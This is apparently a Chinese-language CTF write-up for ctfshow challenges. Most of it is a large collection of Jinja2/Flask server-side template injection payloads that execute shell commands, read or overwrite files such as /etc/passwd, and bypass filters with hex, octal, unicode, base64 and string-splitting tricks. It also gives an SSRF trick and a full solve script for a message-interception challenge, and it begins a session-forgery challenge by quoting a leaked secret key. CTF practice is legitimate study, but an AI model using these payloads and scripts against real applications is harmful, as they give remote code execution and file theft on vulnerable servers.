{{\u0026#34;\u0026#34;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;]}} {{\u0026#34;\u0026#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read()\u0026#34;)}} {{\u0026#34;\u0026#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;id\u0026#39;).read()\u0026#34;)}} {{\u0026#39;\u0026#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)}} #调用 importlib类 {{\u0026#39;\u0026#39;.__class__.__base__.__subclasses__()[128][\u0026#34;load_module\u0026#34;](\u0026#34;os\u0026#34;)[\u0026#34;popen\u0026#34;](\u0026#34;ls /\u0026#34;).read()}} #调用linecache函数 {{\u0026#39;\u0026#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[\u0026#39;linecache\u0026#39;][\u0026#39;os\u0026#39;].popen(\u0026#39;ls /\u0026#39;).read()}} {{[].__class__.__base__.__subclasses__()[59].__init__.__globals__[\u0026#39;linecache\u0026#39;][\u0026#39;os\u0026#39;].popen(\u0026#39;ls\u0026#39;).read()}} {{[].__class__.__base__.__subclasses__()[168].__init__.__globals__.linecache.os.popen(\u0026#39;ls /\u0026#39;).read()}} #调用communicate()函数 {{\u0026#39;\u0026#39;.__class__.__base__.__subclasses__()[128](\u0026#39;whoami\u0026#39;,shell=True,stdout=-1).communicate()[0].strip()}} #写文件 写文件的话就直接把上面的构造里的read()换成write()即可，下面举例利用file类将数据写入文件。 {{\u0026#34;\u0026#34;.__class__.__bases__[0].__bases__[0].__subclasses__()[40](\u0026#39;/tmp\u0026#39;).write(\u0026#39;test\u0026#39;)}} ----python2的str类型不直接从属于属于基类，所以要两次 .__bases__ {{\u0026#39;\u0026#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;file\u0026#39;](\u0026#39;/etc/passwd\u0026#39;).write(\u0026#39;123456\u0026#39;)}} #通用 getshell 原理就是找到含有 __builtins__ 的类，然后利用。 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].eval(\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()\u0026#34;) }}{% endif %}{% endfor %} {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==\u0026#39;catch_warnings\u0026#39; %}{{ c.__init__.__globals__[\u0026#39;__builtins__\u0026#39;].open(\u0026#39;filename\u0026#39;, \u0026#39;r\u0026#39;).read() }}{% endif %}{% endfor %} 有过滤——绕过 . 1.中括号[]绕过\n可以利用 [ ]代替 . 的作用。\n1 2 3 {{().__class__}} 可以替换为：{{()[\u0026#34;__class__\u0026#34;]}} 举例： {{()[\u0026#39;__class__\u0026#39;][\u0026#39;__base__\u0026#39;][\u0026#39;__subclasses__\u0026#39;]()[433][\u0026#39;__init__\u0026#39;][\u0026#39;__globals__\u0026#39;][\u0026#39;popen\u0026#39;](\u0026#39;whoami\u0026#39;)[\u0026#39;read\u0026#39;]()}} 2.attr()绕过\n原生 JinJa2 的 attr() 函数——获取对象的属性。\n1 2 3 4 5 6 {{().__class__}} 可以替换为： {{()|attr(\u0026#34;__class__\u0026#34;)}} {{getattr(\u0026#39;\u0026#39;,\u0026#34;__class__\u0026#34;)}} 举例： {{()|attr(\u0026#39;__class__\u0026#39;)|attr(\u0026#39;__base__\u0026#39;)|attr(\u0026#39;__subclasses__\u0026#39;)()|attr(\u0026#39;__getitem__\u0026#39;)(65)|attr(\u0026#39;__init__\u0026#39;)|attr(\u0026#39;__globals__\u0026#39;)|attr(\u0026#39;__getitem__\u0026#39;)(\u0026#39;__builtins__\u0026#39;)|attr(\u0026#39;__getitem__\u0026#39;)(\u0026#39;eval\u0026#39;)(\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;whoami\u0026#34;).read()\u0026#39;)}} 绕过单双引号 1.request绕过\nflask中存在着request内置对象可以得到请求的信息，request可以用5种不同的方式来请求信息，我们可以利用它来传递参数绕过。\n1 2 3 4 5 6 7 8 9 10 {{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}\u0026amp;arg1=open\u0026amp;arg2=/etc/passwd request.args是flask中的一个属性,为返回请求的参数,把path当作变量名,将后面的路径传值进来,进而绕过了引号的过滤。 若args被过滤了，还可以使用values来接受GET或者POST参数。 可根据题目过滤的东西动态调整方法来进行绕过 {{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()}} Cookie:arg1=open;arg2=/etc/passwd {{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()}} post:arg1=open\u0026amp;arg2=/etc/passwd 2.chr绕过\n使用GET请求，+号记得url编码，否则被当作空格处理。\n1 {% set chr=().__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.chr%}{{\u0026#39;\u0026#39;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(chr(111)%2Bchr(115)).popen(chr(119)%2Bchr(104)%2Bchr(111)%2Bchr(97)%2Bchr(109)%2Bchr(105)).read()}} 绕过关键字 1.反转，使用切片将逆置的关键字顺序输出，进而达到绕过。\n1 2 3 4 5 \u0026#34;\u0026#34;[\u0026#34;__cla\u0026#34;\u0026#34;ss__\u0026#34;] \u0026#34;\u0026#34;.__getattribute__(\u0026#34;__cla\u0026#34;\u0026#34;ss__\u0026#34;) 反转 \u0026#34;\u0026#34;[\u0026#34;__ssalc__\u0026#34;][::-1] \u0026#34;\u0026#34;.__getattribute__(\u0026#34;__ssalc__\u0026#34;[::-1]) 2.+号，利用\u0026quot;+\u0026ldquo;进行字符串拼接，绕过关键字过滤。\n1 {{()[\u0026#39;__cla\u0026#39;+\u0026#39;ss__\u0026#39;].__bases__[0].__subclasses__()[40].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;ev\u0026#39;+\u0026#39;al\u0026#39;](\u0026#34;__im\u0026#34;+\u0026#34;port__(\u0026#39;o\u0026#39;+\u0026#39;s\u0026#39;).po\u0026#34;\u0026#34;pen(\u0026#39;whoami\u0026#39;).read()\u0026#34;)}} 3.join拼接，利用join()函数来绕过关键字过滤\n1 {{[].__class__.__base__.__subclasses__()[40](\u0026#34;fla\u0026#34;.join(\u0026#34;/g\u0026#34;)).read()}} 4.利用引号绕过，以用“或”的形式来绕过：fl\u0026quot;\u0026quot;ag``fl''ag。\n1 {{[].__class__.__base__.__subclasses__()[40](\u0026#34;/fl\u0026#34;\u0026#34;ag\u0026#34;).read()}} 5.使用str原生函数replace替换，将额外的字符拼接进原本的关键字里面，然后利用replace函数将其替换为空。\n1 {{().__getattribute__(\u0026#39;__claAss__\u0026#39;.replace(\u0026#34;A\u0026#34;,\u0026#34;\u0026#34;)).__bases__[0].__subclasses__()[376].__init__.__globals__[\u0026#39;popen\u0026#39;](\u0026#39;whoami\u0026#39;).read()}} 6.ascii转换，将每一个字符都转换为ascii值后再拼接在一起。\n1 2 \u0026#34;{0:c}\u0026#34;.format(97)=\u0026#39;a\u0026#39; \u0026#34;{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}\u0026#34;.format(95,95,99,108,97,115,115,95,95)=\u0026#39;__class__\u0026#39; 7.16进制编码绕过\n1 2 3 4 \u0026#34;__class__\u0026#34;==\u0026#34;\\x5f\\x5fclass\\x5f\\x5f\u0026#34;==\u0026#34;\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f\u0026#34; 例子： {{\u0026#39;\u0026#39;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()}} 8.base64编码绕过，python2，可以利用base64进行绕过，python3没有decode方法，所以不能用该方法绕过。\n1 2 3 4 5 6 \u0026#34;__class__\u0026#34;==(\u0026#34;X19jbGFzc19f\u0026#34;).decode(\u0026#34;base64\u0026#34;) 例子： {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;X19idWlsdGluc19f\u0026#39;.decode(\u0026#39;base64\u0026#39;)][\u0026#39;ZXZhbA==\u0026#39;.decode(\u0026#39;base64\u0026#39;)](\u0026#39;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==\u0026#39;.decode(\u0026#39;base64\u0026#39;))}} 等价于 {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)}} 9.unicode编码\n1 2 {%print((((lipsum|attr(\u0026#34;\\u005f\\u005f\\u0067\\u006c\\u006f\\u0062\\u0061\\u006c\\u0073\\u005f\\u005f\u0026#34;))|attr(\u0026#34;\\u0067\\u0065\\u0074\u0026#34;)(\u0026#34;os\u0026#34;))|attr(\u0026#34;\\u0070\\u006f\\u0070\\u0065\\u006e\u0026#34;)(\u0026#34;\\u0074\\u0061\\u0063\\u0020\\u002f\\u0066\\u002a\u0026#34;))|attr(\u0026#34;\\u0072\\u0065\\u0061\\u0064\u0026#34;)())%} lipsum.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;tac /f*\u0026#39;).read() 10.Hex编码\n1 2 3 4 5 6 7 {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\u0026#39;][\u0026#39;\\x65\\x76\\x61\\x6c\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)}} {{().__class__.__base__.__subclasses__()[77].__init__.__globals__[\u0026#39;\\x6f\\x73\u0026#39;].popen(\u0026#39;\\x6c\\x73\\x20\\x2f\u0026#39;).read()}} 等价于 {{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls /\u0026#34;).read()\u0026#39;)}} {{().__class__.__base__.__subclasses__()[77].__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;ls /\u0026#39;).read()}} 11.8进制编码\n1 {{\u0026#39;\u0026#39;[\u0026#39;\\137\\137\\143\\154\\141\\163\\163\\137\\137\u0026#39;].__mro__[1].__subclasses__()[139].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\u0026#39;](\u0026#39;os\u0026#39;).popen(\u0026#39;whoami\u0026#39;).read()}} 对于这些编码进行绕过，就是将是字符串的关键字进行编码，然后进行对应解码即可，rot13等其他编码也是同理。 12.利用chr函数，无法直接使用chr函数，需要通过__builtins__找\n1 2 {% set chr=url_for.__globals__[\u0026#39;__builtins__\u0026#39;].chr %} {{\u0026#34;\u0026#34;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}} 13.在jinja2可以使用~进行拼接\n1 {%set a=\u0026#39;__cla\u0026#39; %}{%set b=\u0026#39;ss__\u0026#39;%}{{\u0026#34;\u0026#34;[a~b]}} 绕过init 可以用__enter__或__exit__替代\n1 2 3 {{().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;open\u0026#39;](\u0026#39;/etc/passwd\u0026#39;).read()}} {{().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;open\u0026#39;](\u0026#39;/etc/passwd\u0026#39;).read()}} 3.payload 1 2 3 4 5 6 7 8 9 10 11 payload1：hex编码绕过，hex编码了cat /f* {{\u0026#34;ge\u0026#34;.__class__.__base__.__subclasses__()[133].__init__.__globals__[\u0026#39;__builtins__\u0026#39;].__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;\\x63\\x61\\x74\\x20\\x2f\\x66\\x2a\u0026#39;).read()}} payload2：利用cd..，绕过/ {{\u0026#34;\u0026#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[\u0026#39;__builtins__\u0026#39;][\u0026#39;eval\u0026#39;](\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;cd ..\u0026amp;\u0026amp;cat *lag\u0026#39;).read()\u0026#34;)}} payload3：有点像参数逃逸的意思 {{ \u0026#34;\u0026#34;.__class__.__base__ .__subclasses__()[132].__init__.__globals__[\u0026#39;popen\u0026#39;](request.args.get(\u0026#34;ctfshow\u0026#34;)).read()}}ge?ctfshow=cat /flag payload4：base64编码绕过 {{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[\u0026#39;popen\u0026#39;](\u0026#39;echo \u0026#34;Y2F0IC9mbGFn\u0026#34;|base64 -d|sh\u0026#39;).read()}} 暗网聊天室 1.做题思路 1.先进行一波信息搜集 点进博客链接，直接就是出题师傅的博客\n提示了本地访问 9999 端口，可能存在SSRF\n“点我进入宇宙商城” 链接可以访问\n发现了flag格式ctfshow{}，flag可能存在于聊天室的某些宣传中\n点了上面的选项，发现只有插件可以用\n2.“点我进入宇宙商城” 链接，回显了自己的IP 1 2 3 4 5 6 页面内容： 抱歉，本网站因被黑客攻击正在抢修中... Your IP：2.56.12.89 您的访问已记入日志。 3.点开插件，发现了新的东西 继续一波信息搜集\n最上面发现了私钥，原始数据，加密数据\n有一个三层代理的基本原理图\n还有一个加密脚本\n通过脚本观察到了长度128一加密，并且是utf-8编码加密\n看到之前的宣传语，复制，放在文本文件，发现长度为134\u0026gt;128\n复制原始数据，到文本文件，发现长度为18944\n利用加密脚本，先自己跑一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 # 加密 def encrypt(plaintext, public_key): cipher = PKCS1_v1_5.new(RSA.importKey(public_key)) ciphertext = \u0026#39;\u0026#39; for i in range(0, len(plaintext), 128): ciphertext += cipher.encrypt(plaintext[i:i + 128].encode(\u0026#39;utf-8\u0026#39;)).hex() print(len(ciphertext)) return ciphertext key = RSA.generate(2048) public_key1 = key.publickey().export_key() private_key1 = key.export_key() encrypt(\u0026#39;Get ctfshow{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx} for discover dark web secrets. High quality, low price. Perfect for aspiring hackers!\u0026#39;,public_key1) # 运行结果 512 1024 4.访问robots.txt 因为“点我进入宇宙商城” 链接，回显了自己的IP，加密也同意利用了 IP，可能IP会是突破点，查看 robots.txt\n1 2 3 页面内容： user-agent: * Disallow: shop.py.bak 看到了shop.py.bak，继续访问一下\n1 2 3 4 5 6 7 页面内容： if request.args.get(\u0026#39;api\u0026#39;, None) is not None: api = request.args.get(\u0026#39;api\u0026#39;) if re.search(r\u0026#39;^[\\d\\.:]+$\u0026#39;, api): get = requests.get(\u0026#39;http://\u0026#39;+api) html += \u0026#39;\u0026lt;!--\u0026#39;+get.text+\u0026#39;--\u0026gt;\u0026#39; return html 想到本地访问 9999 端口 /shop?api=127.0.0.1:9999\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=utf-8\u0026#34;/\u0026gt; 非常抱歉，本网站因被黑客攻击正在抢修中...\u0026lt;br\u0026gt; \u0026lt;br\u0026gt; Your IP：2.56.12.89\u0026lt;br\u0026gt; 您的访问已记入日志。\u0026lt;br\u0026gt; \u0026lt;!--你先好好看看自己私钥啥格式，别漏了\u0026#34;\\n\u0026#34; \u0026#34;public_key1\u0026#34;: \u0026#34;-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmz4yT2QVwRhVzGQ0FGm6 JQWgIxjsVImyeX8a2D61BPLzEBz8Z8RXaNDzmTIzG8itsCptyXcSMhd8bWbKKpdX xtwAdmUv85aR07XEEX4h/WgTsZLxZorQls5OUwGbRQ9vtzx79u4/mA5ZJ9cyBsMI KLScKf5eH+1nfHqqzlSJXNu+S15obPRVQYAVnXfnygJmq7O33+yYv947e5Gih6ky PisXCKWUOAzAYP8qe1yqS4VWxnIgxm1Ozc7BvgJvxhilBIHnligmlEQaSEHxCW07 ZvJXjTuOyY7VoH5NgmW9c3mv9udvCCFokvB+PCNOej9FUezgUs1sAb4PpAmZLJEU JwIDAQAB -----END PUBLIC KEY-----\u0026#34;, \u0026#34; public_key2\u0026#34;: \u0026#34;-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2zfAOrCxswYCYSt6hVJW 69PhbhRmTD4aDXgThqwRE2Ev16S0uIHSuon7CnkyREiu7FIpG0UBPKAdh2NDZba7 H9UqPgHjHCeikRlQoBUHordJdJDnaQSOf+/u+feKs3IvY+CuHGAP45h57WHovSfb 5NSHGA1VGO/9Zl6WJVjMwY0dNvtdDLYycezUeWSRUX+YVZhMOjWQ1xoEwFwo+qWv 3np+lK3m4Po4I4kN4bdvz14ls5jpzkthIOu1lS6QxSURdA3yms3OWWcWhrZdsEok c+1eB84+uzohllO8+ZHE8LXLAnhKjANGJWnwKsiaVq+gl49yMyU8S52TyYd9Mq/z 7wIDAQAB -----END PUBLIC KEY-----\u0026#34;, \u0026#34; public_key3\u0026#34;: \u0026#34;-----BEGIN PUBLIC KEY----- MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArJXS3k546UPXPpQ/TVjT hX2SUbr+s4ItsRUSUogo558qmdWg8EnjwaOo6Pi6cY2aWb1F2Fhsz17NoMYQ6InW lZqSR6k1uwxbPZ/xK929b/q+6paxoacU05Hopor3LFq0Uw1rf7ZLp22BTbHyFVID xMe/pTuiB1BxlAQiKQ10W5fcJWuuD1E8kFGj37TtlKtu+hPspgC0z8vNnzyI6Z7k 1JpttlNsofQ2AZTziglwtVbrSJJB6R5kCVIKFlpDjdVPH8aEqISqXlsIikS7yNAk 4OZLPO0iA4PhLh5DvbczdJB+wBU3HVr/QRwHf7AmI7c1+PS0DtrBrvVFyk6ZhNTt dwIDAQAB -----END PUBLIC KEY-----\u0026#34;--\u0026gt; 注释里面有 3 个公钥，可以自己利用脚本进行加密，\n通过该网站的公钥 1 和自己的私钥 1 进行加解密，可行，\n说明该网站用户 A 如果对自己 IP 进行加密，然后替换“解密后的数据“中的用户B的IP，最终明文会发送给自己。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 from flask import Flask, request, abort # 加密 def encrypt(plaintext, public_key): cipher = PKCS1_v1_5.new(RSA.importKey(public_key)) ciphertext = \u0026#39;\u0026#39; for i in range(0, len(plaintext), 128): ciphertext += cipher.encrypt(plaintext[i:i+128].encode(\u0026#39;utf8\u0026#39;)).hex() return ciphertext IP = \u0026#39;2.56.12.89\u0026#39; plaintext_half = \u0026#39;拦截的 解密后的数据\u0026#39; # 公钥开头、结尾有俩\\n public_key2 = \u0026#39;-----BEGIN PUBLIC KEY-----\\nxxx\\n-----END PUBLIC KEY-- ---\u0026#39; public_key3 = \u0026#39;-----BEGIN PUBLIC KEY-----\\nxxx\\n-----END PUBLIC KEY-- ---\u0026#39; IP_ciphertext = encrypt(IP, public_key3) IP_ciphertext = encrypt(IP_ciphertext, public_key2) # 替换最终 IP plaintext_half_new = plaintext_half[:2048] + IP_ciphertext + plaintext_half[4096:] print(plaintext_half_new) 将新生成的数据替换“解密后的数据”，利用post传参发送，然后访问，获取 FLAG，因为最终传递的 IP 是自己。\n1 2 # 新生成的解密后数据 624f40b736d3cc973bb4ff63266fd583418692950b182aa482f4a12fa4898e4fa1f281e1996323a5f3ffa7e7a2a2a410004e7d881a3c706c731b47955a68d9dcb2b27d3dab8ee7edc42aaae68c0897b8a53ede59c2b90addcba162279a68bed2eb0babb30dd4dd765563005fd0146ae950c532742b474b05e62344ce8ab65fddbd9da8f3e5cb9c9087b00dd0e432511b89e4889efc16bc8cfdf75348382a8e0b900292897f90bf92479554b68606f788e4725cf31f67848472652c1b6c2433e17f7d19a5c90e6b7ef1650773f0bd9bb46d0efddbbb6b70234f69711a50fe8b63fd294c236cb0eae075116348de5000c7594a5dcfe207e3a73fd0f5b468f400e4547b054da58f6493f2bf77f72f6160d301f10355da74957a13fbe952cc41442c06b96a302d4ded356e5e48a78c03c67434992a9a5069f5529d1c4400c65be639c75c0aba8571a2b6456d07223df26d0857af6efd9214224b1dc3faca135c7bf628c220b12fed7ac95ad676b7b70ae215f5b33cb9fc93730baf38723aa1aa9163bf93c70e7cc37f9c69d804b0715fa3901c6d9e7022d5635b6108ed7688848f27aa5b6cc7e7e20a2a614c610f4493a5e76b50e7717cf97f1ffa1ee106acdd77e246638f386cb0e1a5d9fd4b249a1d2c9423a90636cfa11d58c171a746554916bae0b3c6fb0a469f5ae9c806febb18946adc15df93b1027e4c52c479c1fa57dfe49d2466f3d2e5e917bed4948423b6109f85d30bd94aa4d4e3c5d271db4c9dad8a5e56b6b536515d4596441bc23439f7e2cc4ea57ddf8afdd49937a4cedd0eda267647fdf73701d4dc96f7ff2d0888699a14f5da7eb421b3ed15dc9f0f151845df566ef40d0220dbb3317a3f5dc755060c63d930224df991bdd2a462affbc46100d8b2734695838bda5f4d8f75132597c291123816d7c158fdb893daa568016fda769c690d14cbff5778faea0b21519473f565c4920f1cffd09646ea858bbd908189d6bfd422a2ba8d27e83d4e99aeabb45983e0d5242ed6c4433f369d93df2b6ef92b69914b1b349f39119634568a55ede90fa36f320192124f5c65e4975919fdc22babae4135d3b9a375db27a6d46ee027fd291fa78d3cbc14ec24b89969c364ce56fbebe8ba68589393ffa55cacfe6e9bef0d711e8cacd4fe3339e2aa76c0652e8634fe0d3b19a22e3d4f0baf79f43071c059ce0f85f03567c90b544d225ee97ee2dba9c356dd8db6fc839f55c66318f5d7ba58c1e62e891866a0dc280403c993f9cfd2eac9a766e221c57449efa94e55b17c3bd922f9d6c1ddd79e7b43b27b239cb4c00be876815009dbd8989c470424a5990d1e17a8cc7438fc2fac69d416203f6cfb8332857205212ad72c17fb0b8b301a040ce840de67a9b28e1a1588420f835860162fe767496f64ce28f683ee83b35a37062c6bd48dd4b90e3628987d370664685a0cdc13bb1fc2e8b17b744f9eca3255dcc3ecd455ec6ea29bbfb6cd726b7398eaf3d17f4aec078d591d39e1f0a16c650fbb24dfc384aa04d0aef7f8904ccb26adb9e14da2802af0f1b44eea1acc835abb48bc05ba7a8640ae251ded329f60ef6e2d90ad040317976ead2936c7c6def1214498fab8dc755b81bb6d88f772e1ed913449610ec12a38f2708ea13098e268a2d87314e72b5c74a9a852b91e8ccc35a9279112ac78619fc558116820eed98e70b8f6d1d4ab34ada83ccddd2e33467b6d29a090d65d393c4f1918f650580f0b4e8ad73601987048aa14f1713116a4baaa8a72edbd9e902f0d4dce0bf33edec29451194f41c6c8c5422001f9aa8929d279b43e878e6ad17cfa8626e89a776a23e2a3ce925b9268b923190e2ba279f67d2355a2f3c98576ea0c6944bfae2a1945607414cd32f7eac0714e70fac763e183ec1b745f68b03a3ca9ccae7649b7977dcbf204b4ced74b6a7b3345f5ec7f39240c3d0e3194c413d7d9f367de93a6681318dbfc28de604c40754319f77d6c2d607daeb7b2b87e39cb6d978b995a33ba4f7414ee53956a953b7271962fd8c76cbce84912ffb005ebea6c77639cdba405e968ef746bd9e3228dc0da52698d79ef6a21c93398306d4a93255be6e8e127db6333ca420bd144ac64c13ddebd940c058e983964c0cbafc4342f007a63e17e299c324fb9751226cc6df6d50ba2a50cb90c7ee41460d002954f86388e60c1b3eddf55f0d12faab142a5f54bbd392b5356df12f06b470eae2ace3655dd99ca7a47cf1ef4afab70d9f8e3751211759ef7ecc3746782ee8c6e8bb6daed77643526b8ee5aae2afa6a6b61179e432dd85262e581247de409d80e3094f5d24cae5bfa03e28f6d886d4a5a537fc6419bf577bdbda4e4c8e8877d60f710f3182ca0649518de119ade1f3364400b742b886ccb9369c839d9a2df82a40eebae502c9f19c936df0a79b68b555fa578af472946b7f820ced3beb74d0e329479ec87e7845c9f13d5474f6f04023860c9d05c21d528ff4d8874a59900e743560aa7926d65b9b1ff83d1a817fdd10aa24f390b02d9c1f745752f87081034be140516217b60433197adaf60f7eda650c08802ff8fc27322dbb72bb19086aef2adb63ba29c0ed913822014a361845aa2fe1cb5a30f9ba1f2a24c01f7dca3099ce12cd15e586a86c8f286339aa4dcf022726fad15639562059ae118744bb81310d9dcba153eed0f918f58077b449be60ee18c9cee868c23c396c9f66b2064bfc7114c4eab207bf2f6536ba0fd05435cb861db39278a8b46dc4673d432592c9c153840c94d3d3ef867d76977065597f700b7e1c70654939769efbc5f263b9d0ad9dd1835945948ed09ab40c6e28c9a089d6a8152a929b7142e0a4eef38518185f7fd4556d40d8a9c16b135c1dd941703a6c9384a88ec2c1835ca1d895be51b2ed1a8f675d6cb88ef9a4a7ae981725a9af09b73603f0c4342119668c79df73d68dc4eb157223d8193e85f9917c1c6f378cdc7b042eb18588faacdea994ec599f138fb74fd53494bf6e5d34a5949be6f750dd87e8a854b25a6969b1021eb3e81d6c74be02d95789bdca6fde4bc29d345d42e3e124981f0ea221e4601e95c72b44a6b078eb9e3fcd098f903617b69cab1110615701965a901d9197563595157bfc17e280b8b1e0edc7d3d424d52e6e55f8d44dff6c1685c349bebb6a976fd29658877ed409584ad2c75e9dda60de23607c32e633bd1f20e60f6dd70a8c1045686b1745d4e212c99e31d08bdc5f45550439357b73d20fdf9e92 2.payload：一把梭脚本 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 import re import requests from Crypto.PublicKey import RSA from Crypto.Cipher import PKCS1_v1_5 from flask import Flask, request, abort url = \u0026#39;http://2c5da381-d8ac-4d1b-8918-dc3ebde25791.challenge.ctf.show/\u0026#39; # 题目URL，先等几秒再运行 # 加密 def encrypt(plaintext, public_key): cipher = PKCS1_v1_5.new(RSA.importKey(public_key)) ciphertext = \u0026#39;\u0026#39; for i in range(0, len(plaintext), 128): ciphertext += cipher.encrypt(plaintext[i:i + 128].encode(\u0026#39;utf-8\u0026#39;)).hex() return ciphertext def get_plaintext_half(): text = requests.get(url + \u0026#39;/update\u0026#39;).text return re.findall(\u0026#39;[^@]*\\.92\u0026#39;, text)[0] def get_public_key(public_key): text = requests.get(url + \u0026#39;/shop?a # 获取解密后的数据pi=127.0.0.1:9999\u0026#39;).text return re.findall(\u0026#39;-----BEGIN PUBLIC KEY-----\\n.*\\n.*\\n.*\\n.*\\n.*\\n.*\\n.*\\n-----END PUBLIC KEY-----\u0026#39;, text)[ public_key - 1] IP = \u0026#39;2.56.12.89\u0026#39; plaintext_half = get_plaintext_half() # 获取公钥2、3 public_key2 = get_public_key(2).replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;-----BEGIN PUBLIC KEY-----\u0026#39;, \u0026#39;-----BEGIN PUBLIC KEY-----\\n\u0026#39;).replace( \u0026#39;-----END PUBLIC KEY-----\u0026#39;, \u0026#39;\\n-----END PUBLIC KEY-----\u0026#39;) public_key3 = get_public_key(3).replace(\u0026#39;\\n\u0026#39;, \u0026#39;\u0026#39;).replace(\u0026#39;-----BEGIN PUBLIC KEY-----\u0026#39;, \u0026#39;-----BEGIN PUBLIC KEY-----\\n\u0026#39;).replace( \u0026#39;-----END PUBLIC KEY-----\u0026#39;, \u0026#39;\\n-----END PUBLIC KEY-----\u0026#39;) # 两次加密 IP_ciphertext = encrypt(IP, public_key3) IP_ciphertext = encrypt(IP_ciphertext, public_key2) # 替换最终IP plaintext_half_new = plaintext_half[:2048] + IP_ciphertext + plaintext_half[4096:] # 请求 requests.post(url + \u0026#39;/pass_message\u0026#39;, data={\u0026#39;message\u0026#39;: plaintext_half_new}) # 接收明文 text = requests.get(url + \u0026#39;/update\u0026#39;).text flag = re.findall(\u0026#39;ctfshow{.*}\u0026#39;, text)[0] print(flag) input() easy_flask flask的session伪造+任意文件下载+python命令执行 1.做题思路 1.先去注册，用户名输入admin，返回Account already exists!，说明存在admin用户，但是这题明显不是让你爆破密码 2.注册新用户，然后返回登录。 3.登录页面，发现一个learn链接，但是下面也有提示，某些功能只对admin开放。点进learn链接看看 通过learn页面，发现了session的密钥，可以尝试进行session伪造\n1 app.secret_key = \u0026#39;S3cr3tK3y\u0026#39; 